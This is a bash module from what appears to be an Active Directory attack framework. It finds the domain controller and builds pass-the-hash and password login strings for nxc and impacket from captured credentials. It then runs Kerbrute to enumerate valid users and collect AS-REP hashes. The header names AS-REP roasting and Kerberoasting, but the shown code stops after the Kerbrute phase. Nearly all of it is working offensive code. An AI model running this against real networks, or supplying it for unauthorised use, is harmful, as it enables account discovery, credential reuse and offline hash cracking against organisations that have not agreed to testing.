#!/bin/bash
# MODULE: kerberos.sh - Kerbrute phase, AS-REP roasting, Kerberoasting

# ── Helper: resolve DC_IP if still empty ─────────────────────────────────────
# Called before any Kerberos operation. Sources from (in order):
#   1. dc.txt / -dc flag (already set by args.sh)
#   2. CREDS_FILE domain + LDAP entry IP
#   3. CREDS_FILE domain + signing:True quick scan
#   4. password_policy.txt signing:True line
_resolve_dc_ip() {
    [[ -n "$DC_IP" ]] && return 0
    # From CREDS_FILE: prefer LDAP entry (DC listens on 389)
    if [[ -s "$CREDS_FILE" ]]; then
        local _cf_dom; _cf_dom=$(awk -F'|' '$3!="" {print $3; exit}' "$CREDS_FILE" 2>/dev/null)
        [[ -n "$_cf_dom" && -z "$DOMAIN" ]] && DOMAIN="$_cf_dom"
        DC_IP=$(awk -F'|' '$1=="LDAP" && $3==ENVIRON["DOMAIN"] {print $2; exit}' "$CREDS_FILE" 2>/dev/null)
        [[ -z "$DC_IP" ]] && DC_IP=$(awk -F'|' 'NR==1 && $3!="" {print $2}' "$CREDS_FILE" 2>/dev/null)
    fi
    # From password_policy.txt signing:True (DC always enforces signing)
    if [[ -z "$DC_IP" ]]; then
        for _pf in "$OUTDIR/password_policy.txt" "$OUTDIR/password_policy_guest.txt"; do
            [[ -s "$_pf" ]] || continue
            local _dom; _dom=$(grep -oP '\(domain:\K[^)]+' "$_pf" | grep -iv WORKGROUP | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
            if [[ -n "$_dom" ]]; then
                [[ -z "$DOMAIN" ]] && DOMAIN="$_dom"
                DC_IP=$(grep 'signing:True' "$_pf" | grep "$DOMAIN" | awk '{print $2}' | head -1)
                [[ -n "$DC_IP" ]] && break
            fi
        done
    fi
    # Quick targeted scan of known SMB hosts for signing:True
    if [[ -z "$DC_IP" && -n "$DOMAIN" && -s "$OUTDIR/targets_smb.txt" ]]; then
        DC_IP=$(sudo nxc smb "$OUTDIR/targets_smb.txt" 2>/dev/null | \
            awk -v d="$DOMAIN" '/signing:True/ && $0~d {print $2; exit}')
    fi
    [[ -n "$DC_IP" ]] && echo -e "${GREEN}[+] DC IP resolved: ${WHITE}$DC_IP${NC}"
    return 0
}

# ── Helper: build auth args for impacket from CREDS_FILE or combo mode ────────
_build_ad_auth() {
    AD_USER=""; AD_SECRET=""; AD_CRED_TYPE=""; AD_AUTH_IMPACKET=""; AD_AUTH_NXC=""
    # Source 1: CREDS_FILE (preferred — actual confirmed working creds)
    if [[ -s "$CREDS_FILE" ]]; then
        local _fc; _fc=$(head -1 "$CREDS_FILE")
        IFS='|' read -r _proto _ip _dom _u _s _pwned _ct _ai <<< "$_fc"
        AD_USER="$_u"; AD_SECRET="$_s"; AD_CRED_TYPE="$_ct"
        [[ -n "$_dom" && -z "$DOMAIN" ]] && DOMAIN="$_dom"
    fi
    # Source 2: Combo mode (may not have hit CREDS_FILE if all sprays failed)
    if [[ -z "$AD_USER" && -n "$COMBO_MODE" && -f "$COMBO_PAIRS_FILE" ]]; then
        local _pair; _pair=$(head -1 "$COMBO_PAIRS_FILE")
        AD_USER="${_pair%%:*}"; AD_SECRET="${_pair#*:}"
        [[ "$COMBO_MODE" == "hash" ]] && AD_CRED_TYPE="hash" || AD_CRED_TYPE="password"
    fi
    # Source 3: Single -U -P/-H flags
    if [[ -z "$AD_USER" && -n "$SINGLE_USER" ]]; then
        AD_USER="$SINGLE_USER"
        if [[ -n "$SINGLE_HASH" ]]; then
            AD_SECRET="$SINGLE_HASH"; AD_CRED_TYPE="hash"
        elif [[ -n "$SINGLE_PASS" ]]; then
            AD_SECRET="$SINGLE_PASS"; AD_CRED_TYPE="password"
        fi
    fi
    [[ -z "$AD_USER" || -z "$AD_SECRET" ]] && return 1
    # Build credential strings
    if [[ "$AD_CRED_TYPE" == "hash" ]]; then
        AD_AUTH_NXC="-u '$AD_USER' -H '$AD_SECRET'"
        AD_AUTH_IMPACKET="'$DOMAIN/$AD_USER' -hashes ':$AD_SECRET'"
    else
        AD_AUTH_NXC="-u '$AD_USER' -p '$AD_SECRET'"
        AD_AUTH_IMPACKET="'$DOMAIN/$AD_USER:$AD_SECRET'"
    fi
    return 0
}

ad_attacks() {
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  AD ATTACKS (Phase 2 — pre-spray)                         ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"
    [[ "$STANDALONE" == true ]] && return

    local ATTACK_USERS=""
    [[ -s "$OUTDIR/all_users_clean.txt" ]] && ATTACK_USERS="$OUTDIR/all_users_clean.txt"
    [[ -z "$ATTACK_USERS" && -f "$USERS" ]] && ATTACK_USERS="$USERS"
    [[ -z "$ATTACK_USERS" && -s "$OUTDIR/users_found.txt" ]] && ATTACK_USERS="$OUTDIR/users_found.txt"

    if [[ "$GENERATE_USERS" == true && -n "$ATTACK_USERS" ]]; then
        generate_username_formats "$ATTACK_USERS" "$OUTDIR/users_generated.txt"
        cat "$ATTACK_USERS" "$OUTDIR/users_generated.txt" 2>/dev/null | sort -u > "$OUTDIR/users_all_formats.txt"
        cp "$OUTDIR/users_all_formats.txt" "./generatedusers.txt" 2>/dev/null || true
    elif [[ -n "$ATTACK_USERS" ]]; then
        cp "$ATTACK_USERS" "$OUTDIR/users_all_formats.txt"
    fi

    # Kerbrute — only when not fast mode (slow)
    if [[ "$SKIP_ENUM" != true ]]; then
        if [[ -n "$KERBRUTE_BIN" && -n "$DOMAIN" && -s "$OUTDIR/users_all_formats.txt" ]]; then
            _resolve_dc_ip
            echo -e "${CYAN}[*] Kerbrute user enumeration...${NC}"
            run_cmd "$KERBRUTE_BIN userenum -d '$DOMAIN' --dc '$DC_IP' '$OUTDIR/users_all_formats.txt' -o '$OUTDIR/kerbrute_valid.txt' --hash-file '$OUTDIR/asrep_kerbrute.txt' -t $KERBRUTE_THREADS 2>/dev/null"
            if [[ -s "$OUTDIR/kerbrute_valid.txt" ]]; then
                grep -oP 'VALID.*@' "$OUTDIR/kerbrute_valid.txt" 2>/dev/null | sed 's/VALID.*: //;s/@.*//' | sort -u > "$OUTDIR/valid_users_kerbrute.txt"
                local vc; vc=$(wc -l < "$OUTDIR/valid_users_kerbrute.txt" 2>/dev/null || echo 0)
                echo -e "${GREEN}[+] Kerbrute: $vc valid users${NC}"
                cat "$OUTDIR/valid_users_kerbrute.txt" >> "$ENUM_USERS"
            fi
        fi
    else
        echo -e "${GRAY}[*] Kerbrute skipped (fast mode) — runs via -request in AS-REP below${NC}"
    fi
}
